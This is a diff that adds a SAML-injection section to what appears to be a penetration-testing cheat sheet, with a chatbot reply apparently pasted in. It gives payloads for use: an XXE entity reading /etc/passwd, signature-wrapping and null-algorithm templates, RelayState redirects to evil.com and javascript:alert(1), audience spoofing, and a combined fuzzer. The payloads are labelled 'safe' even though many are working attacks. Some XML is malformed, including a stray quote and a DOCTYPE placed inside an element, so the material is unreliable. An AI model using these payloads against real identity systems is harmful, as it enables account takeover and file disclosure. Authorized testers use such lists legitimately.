@@ -11933,3 +11933,330 @@ evil.zip
 payload.exe masked as invoice.png
 ```
 
+# SAML Injection
+
+> SAML (Security Assertion Markup Language) is an open standard for exchanging authentication and authorization data between parties, in particular, between an identity provider and a service provider. While SAML is widely used to facilitate single sign-on (SSO) and other federated authentication scenarios, improper implementation or misconfiguration can expose systems to various vulnerabilities.
+
+please refer - https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/SAML%20Injection.md?plain=1
+## Summary
+
+* [Tools](#tools)
+* [Methodology](#methodology)
+    * [Invalid Signature](#invalid-signature)
+    * [Signature Stripping](#signature-stripping)
+    * [XML Signature Wrapping Attacks](#xml-signature-wrapping-attacks)
+    * [XML Comment Handling](#xml-comment-handling)
+    * [XML External Entity](#xml-external-entity)
+    * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)
+* [References](#references)
+
+Below is a **safe, defensive, and complete penetration-testing style test case** for **SAML Injection**, including **bypass techniques**, presented in the SAME FORMAT as your Host Header test case:
+
+⚠️ *All payloads are provided for **defensive security testing**, awareness, and validation only — not for exploitation.*
+
+# ✅ **SAML Injection – Complete Test Case (with Bypass Techniques)**
+
+These are the major issues an application may expose if SAML assertions are not validated securely:
+
+1 **Signature Wrapping (XSW)** – Attacker injects malicious unsigned elements while tricking the parser into validating the wrong Assertion. 
+
+2 **SAML Response Manipulation** – Modification of email, userID, roles, groups, or audience restrictions inside the SAML response
+
+3 **Assertion Replay** – Reusing a previously valid SAML response to reauthenticate without credentials.
+
+4 **Algorithm Substitution** – Forcing weak or null signature algorithms (e.g., `None`, `MD5`) to bypass verification.
+
+5 **SAML Parameter Injection** – Injecting malicious XML into Base64-decoded SAML fields (e.g., NameID, Attributes).
+
+6 **Open Redirect via RelayState** – Manipulating `RelayState` or `AssertionConsumerServiceURL` to redirect users to attacker-controlled URLs. 
+
+7 **XML External Entity (XXE)** – Exploiting SAML parser that processes external entities to read files or perform SSRF.
+
+8 **Signature Validation Bypass** – Tricking the app into validating the wrong XML element or ignoring unsigned Assertions.
+
+9 **Audience Restriction Bypass** – Altering `<Audience>` to impersonate another app or tenant. 
+
+10 **Privilege Escalation** – Changing `Role`, `Group`, or `NameID` to escalate privileges (e.g., making attacker an admin). 
+
+
+# **2. Sample Payloads (Safe & Defensive)**
+
+These show *where* injection or tampering occurs for testing. They are **non-exploit payloads**.
+
+---
+
+# 📌 **2.1 Basic SAML Value Tampering Test**
+
+Modify inside `<NameID>`:
+
+```xml
+<NameID>admin@example.com</NameID>
+```
+
+Role escalation example:
+
+```xml
+<Attribute Name="role">
+   <AttributeValue>admin</AttributeValue>
+</Attribute>
+```
+
+---
+
+# 📌 **2.2 Injecting XML into Attributes (SAML Injection)**
+
+```xml
+<Attribute Name="username">
+   <AttributeValue">test"><Injected>VALUE</Injected></AttributeValue>
+</Attribute>
+```
+
+```xml
+<NameID>user@example.com<test>123</test></NameID>
+```
+
+---
+
+# 📌 **2.3 RelayState Manipulation (Redirect Injection)**
+
+```
+RelayState=https://evil.com
+```
+
+```
+RelayState=javascript:alert(1)
+```
+
+---
+
+# 📌 **2.4 XSW (XML Signature Wrapping) Template**
+
+This tests whether the system validates **the correct signed element**.
+
+### Attacker's unsigned assertion:
+
+```xml
+<Assertion>
+  <Subject>
+     <NameID>admin@example.com</NameID>
+  </Subject>
+</Assertion>
+```
+
+### Signed but unused assertion:
+
+```xml
+<SignedAssertion>
+   <Subject>
+      <NameID>original-user@example.com</NameID>
+   </Subject>
+</SignedAssertion>
+```
+
+---
+
+# 📌 **2.5 Replay Attack Test**
+
+Reuse same SAMLResponse twice:
+
+```
+POST /acs
+SAMLResponse=BASE64_VALUE
+```
+
+Check if server blocks replay.
+
+---
+
+# 📌 **2.6 Algorithm Substitution Test (Safe)**
+
+```xml
+<SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-md5" />
+```
+
+```xml
+<SignatureMethod Algorithm="none" />
+```
+
+---
+
+# 📌 **2.7 Audience Restriction Test**
+
+```xml
+<Audience>evil-app.example</Audience>
+```
+
+Check if app verifies intended audience.
+
+---
+
+# 📌 **2.8 XXE Test (Safe Non-execution Form)**
+
+```xml
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<Attribute><AttributeValue>&xxe;</AttributeValue></Attribute>
+```
+
+(App should block external entity resolution.)
+
+---
+
+# **3. Bypass Techniques (Defensive Awareness Only)**
+
+These are **evasion patterns** used to bypass weak SAML validation. For defensive testing only.
+
+---
+
+# 🔥 **3.1 Signature Wrapping Bypass Patterns**
+
+### Duplicate Assertions
+
+```xml
+<Assertion ID="signed">
+   ... legitimate signed content ...
+</Assertion>
+
+<Assertion>
+   <Subject><NameID>admin@example.com</NameID></Subject>
+</Assertion>
+```
+
+Server must reject unsigned secondary assertion.
+
+---
+
+# 🔥 **3.2 Namespace Confusion Bypass**
+
+```xml
+<ds:Signature>
+<dsig:Signature>
+```
+
+Apps with weak namespace validation may fail.
+
+---
+
+# 🔥 **3.3 Whitespace & Formatting Bypass**
+
+```xml
+<NameID>admin@example.com     </NameID>
+```
+
+```xml
+<NameID>
+admin@example.com
+</NameID>
+```
+
+Some apps incorrectly trim or ignore whitespace.
+
+---
+
+# 🔥 **3.4 Encoded / Obfuscated Injection Bypass**
+
+### UTF-16 Base64 SAML:
+
+Encode SAML in UTF-16 → Base64 → test if parser misbehaves.
+
+### HTML Entity Obfuscation:
+
+```xml
+<NameID>&#97;dmin@example.com</NameID>
+```
+
+### Mixed encoding in attributes:
+
+```xml
+<Attribute Name="role">&#x61;dmin</Attribute>
+```
+
+---
+
+# 🔥 **3.5 Double Base64 Encoding Bypass**
+
+Test:
+
+* Base64 decoded once
+* Base64 decoded twice
+
+Improper decoders fail.
+
+---
+
+# 🔥 **3.6 Invalid / Missing Signature Bypass**
+
+```xml
+<Signature></Signature>
+```
+
+```xml
+<SignatureValue></SignatureValue>
+```
+
+System should still reject.
+
+---
+
+# 🔥 **3.7 Fake KeyInfo Attack**
+
+```xml
+<KeyInfo>
+   <KeyValue>FakePublicKeyHere</KeyValue>
+</KeyInfo>
+```
+
+Weak validators mistakenly validate using provided key.
+
+---
+
+# 🔥 **3.8 Audience Restriction Bypass**
+
+Alternate hostnames:
+
+```
+Audience: target.com.attacker.com
+Audience: https://target.com.evil.io
+Audience: target.com/
+Audience: target.com.#evil
+```
+
+---
+
+# 🔥 **3.9 Clock Skew Abuse (Timing Bypass)**
+
+Set timestamps far into past or future:
+
+```xml
+<Conditions NotBefore="1900-01-01" NotOnOrAfter="2999-12-31">
+```
+
+Application must verify clock window.
+
+---
+
+# ✔ **4. Combined Master Fuzzer Template**
+
+This is a **defensive combined test payload** to detect SAML parsing weaknesses:
+
+```xml
+<Response>
+  <Assertion>
+    <Subject><NameID>admin@example.com</NameID></Subject>
+  </Assertion>
+
+  <Assertion ID="signed">
+     <Subject><NameID>user@example.com</NameID></Subject>
+  </Assertion>
+
+  <!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
+  <Attribute><AttributeValue>&xxe;</AttributeValue></Attribute>
+
+  <SignatureMethod Algorithm="none" />
+  <Audience>evil-app.example</Audience>
+</Response>
+```
+
+---
